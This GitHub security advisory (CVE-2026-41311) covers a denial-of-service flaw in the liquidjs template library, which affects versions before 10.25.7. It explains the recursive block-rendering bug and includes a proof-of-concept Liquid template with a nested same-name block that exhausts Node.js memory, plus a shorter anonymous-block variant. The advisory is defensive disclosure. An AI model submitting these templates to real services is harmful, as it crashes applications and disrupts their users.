# [H] liquidjs has a Denial of Service via circular block reference in layout

## Summary
Severity: High
Advisory: GHSA-4rc3-7j7w-m548
CVE: CVE-2026-41311
CWE: CWE-674
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-4rc3-7j7w-m548
Type: github-advisory

## Affected
- npm: `liquidjs` — affected >=0 <10.25.7

## Details
### Summary

A circular block reference in `{% layout %}` / `{% block %}` causes an infinite recursive loop, consuming all available memory (~4GB) and crashing the Node.js process with `FATAL ERROR: JavaScript heap out of memory`. This allows any user who can submit a Liquid template to perform a Denial of Service attack.

### Details

In `src/tags/block.ts`, during OUTPUT mode, each block looks up its render function from `ctx.getRegister('blocks')[this.block]`. When a block with name `a` is nested inside another block also named `a` in a child template, the inner block finds the outer block's render function and calls it. The outer block's templates contain the inner block again, creating infinite recursion with no termination condition.

Relevant code (`src/tags/block.ts`, `getBlockRender` method):

```typescript
private getBlockRender (ctx: Context) {
  const { liquid, templates } = this
  const renderChild = ctx.getRegister('blocks')[this.block]
  const renderCurrent = function * (superBlock: BlockDrop, emitter: Emitter) {
    ctx.push({ block: superBlock })
    yield liquid.renderer.renderTemplates(templates, ctx, emitter)
    ctx.pop()
  }
  return renderChild
    ? (superBlock: BlockDrop, emitter: Emitter) => renderChild(
        new BlockDrop(
          (emitter: Emitter) => renderCurrent(superBlock, emitter)
        ),
        emitter)
    : renderCurrent
}
```

When `renderChild` exists (same-name block found), it calls `renderChild` which re-renders templates containing the nested block, which again finds `renderChild`, and so on — infinite loop.

### PoC

**1. Create a layout file** (`layout.html`):

```liquid
<header>{% block a %}default-a{% endblock %}</header>
<main>{% block b %}default-b{% endblock %}</main>
<footer>{% block c %}default-c{% endblock %}</footer>
```

**2. Create a template that uses the layout:**

```liquid
{% layout "layout" %}
{% block a %}outer-a {% block a %}inner-a{% endblock %}{% endblock %}
{% block b %}content-b{% endblock %}
{% block c %}content-c{% endblock %}
```

**3. Render:**

```javascript
const { Liquid } = require('liquidjs')
const liquid = new Liquid({ root: './', extname: '.html' })
liquid.renderFile('template').then(console.log)
// Result: process hangs, memory grows to ~4GB, then crashes with OOM
```

The anonymous block variant also triggers the same issue:

```liquid
{% layout "parent" %}
{%block%}A{%block%}B{%endblock%}{%endblock%}
```

### Impact

**Denial of Service (DoS).** Any application that accepts user-provided or user-influenced Liquid templates — such as CMS platforms, email template builders, multi-tenant SaaS products, or static site generators with untrusted input — can be crashed by a single malicious template. The attack requires no authentication beyond the ability to submit a template, and no special configuration. The Node.js process is killed by the OS due to memory exhaustion, causing complete service disruption.

## References
- https://github.com/harttle/liquidjs/security/advisories/GHSA-4rc3-7j7w-m548
- https://nvd.nist.gov/vuln/detail/CVE-2026-41311
- https://github.com/harttle/liquidjs/commit/e2311dfd6e82f73509308aa8a3a1fafc92e226f0
- https://github.com/harttle/liquidjs
- https://github.com/harttle/liquidjs/releases/tag/v10.25.7
